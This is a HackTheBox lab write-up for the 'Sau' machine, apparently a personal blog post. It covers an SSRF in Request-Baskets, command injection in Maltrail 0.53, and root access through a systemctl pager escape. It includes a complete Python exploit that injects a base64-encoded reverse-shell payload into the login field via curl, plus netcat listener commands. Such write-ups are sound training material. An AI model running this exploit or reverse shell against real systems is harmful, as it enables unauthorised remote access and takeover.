---
title: "SAU"
date: 2023-12-31
layout: "simple"
categories: [Boot2root]
tags: [HackTheBox]
image: https://i.ibb.co/cgYN2Kr/th-3134630742.jpg
---

Hello and welcome to my first writeup on Hack the box machines. We will be handling an easy machine named Sau. We will use real vulnerabilities that were discovered before and we will also make use of exploits that had been used before. Let's begin.

## Enumaration

First of all we are going to run a NMAP scan to scan for open ports.

![1](https://i.ibb.co/bFPd1Sv/nmap.png) 

![2](https://i.ibb.co/Z23FwTJ/report.png)

From the scan we can see that port 22 is open on which ssh runs. But since we have no credentials we would not be able to use this. We can then see that the port 80 has been filtered which would mean we cannot communicate with it from outside the network. Then port 55555 would definately catch our attention. From the report we can see that the port is accessible on our browser and it allows for the get option.

We can access this by `http://machine_ip:55555` which will lead us to a page with request baskets.

## Request-baskets SSRF

When we visit the page this is what we can see

![3](https://i.ibb.co/CWbzyxx/55555.png) 

This is basically a page which creates request-baskets. What is interesting is we have a service and a version running. We can look this up and we see that we have a lurking vulnerability which is `Server Side Request Forgery`. This vulnerability exists due to some improper validation in a path and would ideally be leveraged to connect to any HTTP server on the network. 

To exploit this we need to create a basket and change some of the configurations on the basket.

![4](https://i.ibb.co/p43QH7R/configuration.png)

First we need to set an URL where the requests will be forwarded to. We can use localhost and set the port to port `80`.

Secondly we need to set `insecure_tls` to true which will ideally bypass the certificate verification.
Next, we need to set `proxy response` to true which will send response of the forwarded server back to our client.

Lastly, setting `expand_path` set to true makes forward_url path expanded when original http request contains compound path.

From here we only need to visit the URL so as to trigger this vulnerability.

## Exploiting Mailtrail

So when we visit the URL we can see a page that looks like this

![5](https://i.ibb.co/bKqqHK3/mailtrail.png)

We do not see much but we get a service running and its version. We can then look for the vulnerabilities associated with the service and version running.

We then can get a python exploit script which would exploit a command injection vulnerability. The exploit creates a reverse shell payload encoded in Base64 to bypass potential protections like WAF, IPS or IDS and delivers it to the target URL using a curl command
The payload is then executed on the target system, establishing a reverse shell connection back to the attacker's specified IP and port

The python script is as follows:
   
    #!/bin/python3

    import sys
    import os
    import base64

    # Arguments to be passed
    YOUR_IP = sys.argv[1]  # <your ip>
    YOUR_PORT = sys.argv[2]  # <your port>
    TARGET_URL = sys.argv[3]  # <target url>

    print("\n[+]Started MailTrail version 0.53 Exploit")

    # Fail-safe for arguments
    if len(sys.argv) != 4:
        print("Usage: python3 mailtrail.py <your ip> <your port> <target url>")
        sys.exit(-1)


    # Exploit the vulnerbility
    def exploit(my_ip, my_port, target_url):
    # Defining python3 reverse shell payload
        payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
    # Encoding the payload with base64 encoding
        encoded_payload = base64.b64encode(payload.encode()).decode()
    # curl command that is to be executed on our system to exploit mailtrail
        command = f"curl '{target_url}/login' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
    # Executing it
        os.system(command)


    print("\n[+]Exploiting MailTrail on {}".format(str(TARGET_URL)))
    try:
        exploit(YOUR_IP, YOUR_PORT, TARGET_URL)
        print("\n[+] Successfully Exploited")
        print("\n[+] Check your Reverse Shell Listener")
    except:
        print("\n[!] An Error has occured. Try again!")


First we need to run a netcat listener on our machine, `nc -lnvp port`.

Next we need to execute the exploit example, `python3 exploit.py [ip] [port] [target_url]`.
From here we need to check at our listener for any connections. And we should be connected as a user.

![6](https://i.ibb.co/kD3nP6H/user.png)

## Privilege Escalation

Next we should try to escalate our privileges to root. Well we can run `sudo -l` which would help us to know what commands we can run as `sudo`.

![7](https://i.ibb.co/sv9GX12/privesc.png)

We see that we can run `systemctl status trail.sevice` as sudo. Then we can run `!sh` and press return.

![8](https://i.ibb.co/Fz1H9zr/root.png)

We are root. We can then find our flags.

## Conclusion 
HTB machines are awesome. Happy hacking 
